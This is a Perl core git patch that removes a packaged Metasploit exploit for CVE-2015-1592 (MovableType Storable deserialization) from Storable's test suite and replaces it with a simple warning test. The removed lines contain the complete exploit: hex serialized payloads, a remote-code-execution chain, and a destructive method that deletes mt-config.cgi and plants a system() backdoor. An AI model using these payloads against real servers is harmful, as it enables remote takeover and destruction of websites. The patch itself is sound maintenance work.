@@ -1,0 +1,340 @@
+From 7b58878cdf3c4cea3f622b8b4f07146732daa4b1 Mon Sep 17 00:00:00 2001
+From: Tony Cook <tony@develop-help.com>
+Date: Mon, 3 Dec 2018 16:15:52 +1100
+Subject: [PATCH 1/2] (perl #133706) remove exploit code from Storable
+
+Storable packaged the metasploit framework code for CVE-2015-1592,
+which triggered virus scanners.
+
+To prevent that remove the packaged exploit code and test for the
+underlying structure we trigger the warning on.
+
+(cherry picked from commit fb5f378b17e3b41db03064c19b9205db64a3354c)
+---
+ MANIFEST                          |   1 -
+ dist/Storable/t/CVE-2015-1592.inc | 261 --------------------------------------
+ dist/Storable/t/CVE-2015-1592.t   |  25 ++--
+ 3 files changed, 12 insertions(+), 275 deletions(-)
+ delete mode 100644 dist/Storable/t/CVE-2015-1592.inc
+
+diff --git a/MANIFEST b/MANIFEST
+index e7ddf5b475..dce3c75cbf 100644
+--- a/MANIFEST
++++ b/MANIFEST
+@@ -3716,7 +3716,6 @@ dist/Storable/t/code.t			See if Storable works
+ dist/Storable/t/compat01.t		See if Storable works
+ dist/Storable/t/compat06.t		See if Storable works
+ dist/Storable/t/croak.t			See if Storable works
+-dist/Storable/t/CVE-2015-1592.inc	See if Storable works
+ dist/Storable/t/CVE-2015-1592.t		See if Storable works
+ dist/Storable/t/dclone.t		See if Storable works
+ dist/Storable/t/destroy.t		Test Storable in global destructon
+diff --git a/dist/Storable/t/CVE-2015-1592.inc b/dist/Storable/t/CVE-2015-1592.inc
+deleted file mode 100644
+index 481dba5307..0000000000
+--- a/dist/Storable/t/CVE-2015-1592.inc
++++ /dev/null
+@@ -1,261 +0,0 @@
+-#!/usr/bin/perl
+-
+-=pod
+-
+-class MetasploitModule < Msf::Exploit::Remote
+-  Rank = GoodRanking
+-
+-  include Msf::Exploit::Remote::HttpClient
+-
+-  def initialize(info = {})
+-    super(update_info(info,
+-      'Name'           => 'SixApart MovableType Storable Perl Code Execution',
+-      'Description'    => %q{
+-          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
+-          arbitrary code. The default nondestructive mode depends on the target server having
+-          the Object::MultiType and DateTime Perl modules installed in Perl's @INC paths.
+-          The destructive mode of operation uses only required MovableType dependencies,
+-          but it will noticeably corrupt the MovableType installation.
+-      },
+-      'Author'         =>
+-        [
+-          'John Lightsey',
+-        ],
+-      'License'        => MSF_LICENSE,
+-      'References'     =>
+-        [
+-          [ 'CVE', '2015-1592' ],
+-          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],
+-        ],
+-      'Privileged'     => false, # web server context
+-      'Payload'        =>
+-        {
+-          'DisableNops' => true,
+-          'BadChars'    => ' ',
+-          'Space'       => 1024,
+-        },
+-      'Compat'         =>
+-        {
+-          'PayloadType' => 'cmd'
+-        },
+-      'Platform'       => ['unix'],
+-      'Arch'           => ARCH_CMD,
+-      'Targets'        => [['Automatic', {}]],
+-      'DisclosureDate' => 'Feb 11 2015',
+-      'DefaultTarget'  => 0))
+-
+-    register_options(
+-      [
+-        OptString.new('TARGETURI', [true, 'MoveableType cgi-bin directory path', '/cgi-bin/mt/']),
+-        OptBool.new('DESTRUCTIVE', [true, 'Use destructive attack method (more likely to succeed, but corrupts target system.)', false])
+-      ], self.class
+-    )
+-
+-  end
+-
+-=cut
+-
+-# generate config parameters for injection checks
+-
+-use Storable;
+-
+-{
+-
+-    package XXXCHECKXXX;
+-
+-    sub STORABLE_thaw {
+-        return 1;
+-    }
+-
+-    sub STORABLE_freeze {
+-        return 1;
+-    }
+-
+-}
+-
+-my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
+-my $frozen2 = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
+-$frozen2 = unpack 'H*', $frozen2;
+-#print "LFI test for storable flaw is: $frozen2\n";
+-
+-{
+-    package DateTime;
+-    use overload '+' => sub { 'ignored' };
+-}
+-
+-=pod
+-
+-  def check
+-    vprint_status("Sending storable test injection for XXXCHECKXXX.pm load failure")
+-    res = send_request_cgi({
+-        'method'    => 'GET',
+-        'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-        'vars_get' => {
+-          '__mode' => 'retry',
+-          'step'   => 'configure',
+-          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'
+-        }
+-      })
+-
+-    unless res && res.code == 200 && res.body.include?("Can't locate XXXCHECKXXX.pm")
+-      vprint_status("Failed XXXCHECKXXX.pm load test");
+-      return Exploit::CheckCode::Safe
+-    end
+-    Exploit::CheckCode::Vulnerable
+-  end
+-
+-  def exploit
+-    if datastore['DESTRUCTIVE']
+-      exploit_destructive
+-    else
+-      exploit_nondestructive
+-    end
+-  end
+-
+-=cut
+-
+-#!/usr/bin/perl
+-
+-# Generate nondestructive config parameter for RCE via Object::MultiType
+-# and Try::Tiny. The generated value requires minor modification to insert
+-# the payload inside the system() call and resize the padding.
+-
+-use Storable;
+-
+-{
+-    package Object::MultiType;
+-    use overload '+' => sub { 'ingored' };
+-}
+-
+-{
+-    package Object::MultiType::Saver;
+-}
+-
+-#{
+-#    package DateTime;
+-#    use overload '+' => sub { 'ingored' };
+-#}
+-
+-{
+-    package Try::Tiny::ScopeGuard;
+-}
+-
+-my $try_tiny_loader = bless {}, 'DateTime';
+-my $multitype_saver = bless { c => 'MT::run_app' }, 'Object::MultiType::Saver';
+-my $multitype_coderef = bless \$multitype_saver, 'Object::MultiType';
+-my $try_tiny_executor = bless [$multitype_coderef, 'MT;print qq{Content-type: text/plain\n\n};system(q{});' . ('#' x 1025) . "\nexit;"], 'Try::Tiny::ScopeGuard';
+-
+-my $data = [$try_tiny_loader, $try_tiny_executor];
+-my $frozen1 = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
+-$frozen1 = unpack 'H*', $frozen1;
+-#print "RCE payload requiring Object::MultiType and DateTime: $frozen1\n";
+-
+-=pod
+-
+-  def exploit_nondestructive
+-    print_status("Using nondestructive attack method")
+-    config_payload = "53455247000000000000000304080831323334353637380408080802020000001411084461746554696d6503000000000411155472793a3a54696e793a3a53636f7065477561726402020000001411114f626a6563743a3a4d756c7469547970650411184f626a6563743a3a4d756c7469547970653a3a536176657203010000000a0b4d543a3a72756e5f6170700100000063013d0400004d543b7072696e742071717b436f6e74656e742d747970653a20746578742f706c61696e5c6e5c6e7d3b73797374656d28717b"
+-    config_payload <<  payload.encoded.unpack('H*')[0]
+-    config_payload << "7d293b"
+-    config_payload << "23" * (1025 - payload.encoded.length)
+-    config_payload << "0a657869743b"
+-
+-    print_status("Sending payload (#{payload.raw.length} bytes)")
+-
+-    send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get' => {
+-        '__mode' => 'retry',
+-        'step'   => 'configure',
+-        'config' => config_payload
+-      }
+-    }, 5)
+-  end
+-
+-=cut
+-
+-#!/usr/bin/perl
+-
+-# Generate destructive config parameter to unlink mt-config.cgi
+-
+-use Storable;
+-
+-{
+-    package CGITempFile;
+-}
+-
+-my $unlink_target = "mt-config.cgi";
+-my $cgitempfile = bless \$unlink_target, "CGITempFile";
+-
+-$data = [$cgitempfile];
+-my $frozen_data = Storable::freeze($data);
+-my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . $frozen_data;
+-$frozen = unpack 'H*', $frozen;
+-#print "RCE unlink payload requiring CGI: $frozen\n";
+-
+-# $Storable::DEBUGME = 1;
+-# $^W = 1;
+-Storable::thaw($frozen_data);
+-
+-=pod
+-
+-def exploit_destructive
+-    print_status("Using destructive attack method")
+-    # First we need to delete mt-config.cgi using the storable injection
+-
+-    print_status("Sending storable injection to unlink mt-config.cgi")
+-
+-    res = send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get' => {
+-        '__mode' => 'retry',
+-        'step'   => 'configure',
+-        'config' => '534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769'
+-      }
+-    })
+-
+-    if res && res.code == 200
+-      print_status("Successfully sent unlink request")
+-    else
+-      fail_with(Failure::Unknown, "Error sending unlink request")
+-    end
+-
+-    # Now we rewrite mt-config.cgi to accept a payload
+-
+-    print_status("Rewriting mt-config.cgi to accept the payload")
+-
+-    res = send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt-wizard.cgi'),
+-      'vars_get'  => {
+-        '__mode'             => 'next_step',
+-        'step'               => 'optional',
+-        'default_language'   => 'en_us',
+-        'email_address_main' => "x\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\n\\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};unlink('mt-config.cgi');exit;1",
+-        'set_static_uri_to'  => '/',
+-        'config'             => '5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f', # equivalent to 'set_static_file_to' => '/',
+-      }
+-    })
+-
+-    if res && res.code == 200
+-      print_status("Successfully sent mt-config rewrite request")
+-    else
+-      fail_with(Failure::Unknown, "Error sending mt-config rewrite request")
+-    end
+-
+-    # Finally send the payload
+-
+-    print_status("Sending payload request")
+-
+-    send_request_cgi({
+-      'method'    => 'GET',
+-      'uri'       => normalize_uri(target_uri.path, 'mt.cgi'),
+-      'vars_get'  => {
+-        'xyzzy'   => payload.encoded,
+-      }
+-    }, 5)
+-  end
+-
+-=cut
+diff --git a/dist/Storable/t/CVE-2015-1592.t b/dist/Storable/t/CVE-2015-1592.t
+index 2730cdc9d1..a71f44c0cb 100644
+--- a/dist/Storable/t/CVE-2015-1592.t
++++ b/dist/Storable/t/CVE-2015-1592.t
+@@ -1,22 +1,21 @@
+ #!/usr/bin/perl
+ 
+ use strict;
++use warnings;
+ use Test::More;
++use Storable qw(freeze thaw);
+ plan tests => 1;
+ 
+-use File::Temp qw(tempdir);
+-use File::Spec;
+-my $tmp_dir = tempdir(CLEANUP => 1);
+-my $tmp_file = File::Spec->catfile($tmp_dir, 'sploit');
++# this original worked with the packaged exploit, but that
++# triggers virus scanners, so test for the behaviour instead
++my $x = bless \(my $y = "mt-config.cgi"), "CGITempFile";
++
++my $frozen = freeze($x);
+ 
+-my $file = __FILE__;
+-$file =~ s/\.t$/.inc/;
+-my $inc = $ENV{PERL_CORE} ? "-Ilib -I../../lib" : "-I".join(" -I", @INC);
+-system qq($^X $inc -w "$file" 2>$tmp_file);
+-open(my $fh, "<", $tmp_file) or die "$tmp_file $!";
+ {
+-  local $/;
+-  my $err = <$fh>;
+-  like($err, qr/SECURITY: Movable-Type CVE-2015-1592 Storable metasploit attack/,
+-       'Detect CVE-2015-1592');
++    my $warnings = '';
++    local $SIG{__WARN__} = sub { $warnings .= "@_" };
++    thaw($frozen);
++    like($warnings, qr/SECURITY: Movable-Type CVE-2015-1592 Storable metasploit attack/,
++         'Detect CVE-2015-1592');
+ }
+-- 
+2.15.1.windows.2
+
